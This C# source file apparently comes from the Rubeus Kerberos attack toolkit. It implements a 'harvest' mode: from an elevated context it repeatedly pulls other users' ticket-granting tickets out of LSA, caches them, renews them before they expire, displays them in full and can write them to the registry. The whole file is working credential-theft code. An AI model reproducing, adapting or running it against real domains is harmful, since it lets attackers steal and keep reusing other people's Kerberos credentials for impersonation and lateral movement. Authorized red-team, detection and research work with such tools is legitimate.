b'\xef\xbb\xbfusing System;\nusing System.Collections.Generic;\nusing System.Threading;\nusing Rubeus.lib.Interop;\n\nnamespace Rubeus\n{\n    public class Harvest\n    {\n        private readonly List<KRB_CRED> harvesterTicketCache = new List<KRB_CRED>();\n        private readonly int monitorIntervalSeconds;\n        private readonly int displayIntervalSeconds;\n        private readonly string targetUser;\n        private readonly bool renewTickets;\n        private readonly string registryBasePath;\n        private readonly bool nowrap;\n        private readonly int runFor;\n        private DateTime lastDisplay;\n        private DateTime collectionStart;\n\n        public Harvest(int monitorIntervalSeconds, int displayIntervalSeconds, bool renewTickets, string targetUser, string registryBasePath, bool nowrap, int runFor)\n        {\n            this.monitorIntervalSeconds = monitorIntervalSeconds;\n            this.displayIntervalSeconds = displayIntervalSeconds;\n            this.renewTickets = renewTickets;\n            this.targetUser = targetUser;\n            this.registryBasePath = registryBasePath;\n            this.lastDisplay = DateTime.Now;\n            this.collectionStart = DateTime.Now;\n            this.nowrap = nowrap;\n            this.runFor = runFor;\n        }\n\n        public void HarvestTicketGrantingTickets()\n        {\n            if (!Helpers.IsHighIntegrity())\n            {\n                Console.WriteLine("\\r\\n[X] You need to have an elevated context to dump other users\' Kerberos tickets :( \\r\\n");\n                return;\n            }\n\n            // get the current set of TGTs\n            while (true)\n            {\n                // extract out the TGTs (service = krbtgt_ w/ full data, silent enumeration\n                List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(true, new LUID(), "krbtgt", this.targetUser, null, true, true);\n                List<KRB_CRED> currentTickets = new List<KRB_CRED>();\n                foreach(var sessionCred in sessionCreds)\n                {\n                    foreach(var ticket in sessionCred.Tickets)\n                    {\n                        currentTickets.Add(ticket.KrbCred);\n                    }\n                }\n\n                if (renewTickets) {\n                    // "harvest" mode - so don\'t display new tickets as they come in\n                    AddTicketsToTicketCache(currentTickets, false);\n\n                    // check if we\'re at a new display interval\n                    if(lastDisplay.AddSeconds(this.displayIntervalSeconds) < DateTime.Now.AddSeconds(1))\n                    {\n                        this.lastDisplay = DateTime.Now;\n                        // refresh/renew everything in the cache and display the working set\n                        RefreshTicketCache(true);\n                        Console.WriteLine("[*] Sleeping until {0} ({1} seconds) for next display\\r\\n", DateTime.Now.AddSeconds(displayIntervalSeconds), displayIntervalSeconds);\n                    }\n                    else\n                    {\n                        // refresh/renew everything in the cache, but don\'t display the working set\n                        RefreshTicketCache();\n                    }\n                }\n                else\n                {\n                    // "monitor" mode - display new ticketson harvest\n                    AddTicketsToTicketCache(currentTickets, true);\n                }\n\n                if (registryBasePath != null)\n                {\n                    LSA.SaveTicketsToRegistry(harvesterTicketCache, registryBasePath);\n                }\n\n                if (runFor > 0)\n                {\n                    // compares execution start time + time entered to run the harvest for against current time to determine if we should exit\n                    if (collectionStart.AddSeconds(this.runFor) < DateTime.Now)\n                    {\n                        Console.WriteLine("[*] Completed running for {0} seconds, exiting\\r\\n", runFor);\n                        System.Environment.Exit(0);\n                    }\n                }\n\n                // If a runFor time is set and the monitoring interval is longer than the time remaining on the run, \n                // the sleep interval will be adjusted down to however much time left in the run there is. \n                if (runFor > 0 && collectionStart.AddSeconds(this.runFor) < DateTime.Now.AddSeconds(monitorIntervalSeconds))\n                {\n                    TimeSpan t = collectionStart.AddSeconds(this.runFor + 1) - DateTime.Now;\n                    Thread.Sleep((int)t.TotalSeconds * 1000);\n                }\n                // else we\'ll do a normal monitor interval sleep\n                else\n                {\n                    Thread.Sleep(monitorIntervalSeconds * 1000);\n                }\n            }\n        }\n\n        private void AddTicketsToTicketCache(List<KRB_CRED> tickets, bool displayNewTickets)\n        {\n            // adds a list of KRB_CREDs to the internal cache\n            //  displayNewTickets - display new TGTs as they\'re added, e.g. "monitor" mode\n\n            bool newTicketsAdded = false;\n\n            if (tickets == null)\n                throw new ArgumentNullException(nameof(tickets));\n\n            foreach (var ticket in tickets)\n            {\n                var newTgtBytes = Convert.ToBase64String(ticket.RawBytes);\n\n                var ticketInCache = false;\n\n                foreach (var cachedTicket in harvesterTicketCache)\n                {\n                    // check the base64 of the raw ticket bytes to see if we\'ve seen it before\n                    if (Convert.ToBase64String(cachedTicket.RawBytes) == newTgtBytes)\n                    {\n                        ticketInCache = true;\n                        break;\n                    }\n                }\n\n                if (ticketInCache)\n                    continue;\n\n                var endTime = TimeZone.CurrentTimeZone.ToLocalTime(ticket.enc_part.ticket_info[0].endtime);\n\n                if (endTime < DateTime.Now)\n                {\n                    // skip if the ticket is expired\n                    continue;\n                }\n\n                harvesterTicketCache.Add(ticket);\n                newTicketsAdded = true;\n\n                if (displayNewTickets)\n                {\n                    Console.WriteLine($"\\r\\n[*] {DateTime.Now.ToUniversalTime()} UTC - Found new TGT:\\r\\n");\n                    LSA.DisplayTicket(ticket, 2, true, true, false, this.nowrap);\n                }\n            }\n\n            if(displayNewTickets && newTicketsAdded)\n                Console.WriteLine("[*] Ticket cache size: {0}\\r\\n", harvesterTicketCache.Count);\n        }\n\n        private void RefreshTicketCache(bool display = false)\n        {\n            // goes through each ticket in the cache, removes any tickets that have expired\n            //  and renews any tickets that are going to expire before the next check interval\n            //  then displays the current "active" ticket cache if "display" is passed as true\n\n            if (display)\n                Console.WriteLine("\\r\\n[*] Refreshing TGT ticket cache ({0})\\r\\n", DateTime.Now);\n\n            for (var i = harvesterTicketCache.Count - 1; i >= 0; i--)\n            {\n                var endTime = TimeZone.CurrentTimeZone.ToLocalTime(harvesterTicketCache[i].enc_part.ticket_info[0].endtime);\n                var renewTill = TimeZone.CurrentTimeZone.ToLocalTime(harvesterTicketCache[i].enc_part.ticket_info[0].renew_till);\n                var userName = harvesterTicketCache[i].enc_part.ticket_info[0].pname.name_string[0];\n                var domainName = harvesterTicketCache[i].enc_part.ticket_info[0].prealm;\n\n                // check if the ticket has now expired\n                if (endTime < DateTime.Now)\n                {\n                    Console.WriteLine("[!] Removing TGT for {0}@{1}\\r\\n", userName, domainName);\n                    // remove the ticket from the cache\n                    Console.WriteLine("harvesterTicketCache count: {0}", harvesterTicketCache.Count);\n                    harvesterTicketCache.RemoveAt(i);\n                    Console.WriteLine("harvesterTicketCache count: {0}", harvesterTicketCache.Count);\n                }\n\n                else\n                {\n                    // check if the ticket is going to expire before the next interval checkin\n                    //  but we\'ll still be in the renew window\n                    if ( (endTime < DateTime.Now.AddSeconds(monitorIntervalSeconds)) && (renewTill > DateTime.Now.AddSeconds(monitorIntervalSeconds)) )\n                    {\n                        // renewal limit after checkin interval, so renew the TGT\n                        userName = harvesterTicketCache[i].enc_part.ticket_info[0].pname.name_string[0];\n                        domainName = harvesterTicketCache[i].enc_part.ticket_info[0].prealm;\n\n                        Console.WriteLine("[*] Renewing TGT for {0}@{1}\\r\\n", userName, domainName);\n                        var bytes = Renew.TGT(harvesterTicketCache[i], "", false, "", false);\n                        var renewedCred = new KRB_CRED(bytes);\n                        harvesterTicketCache[i] = renewedCred;\n                    }\n\n                    if (display)\n                        LSA.DisplayTicket(harvesterTicketCache[i], 2, true, true, false, this.nowrap);\n                }\n\n            }\n\n            if (display)\n                Console.WriteLine("[*] Ticket cache size: {0}", harvesterTicketCache.Count);\n        }\n\n    }\n}\n'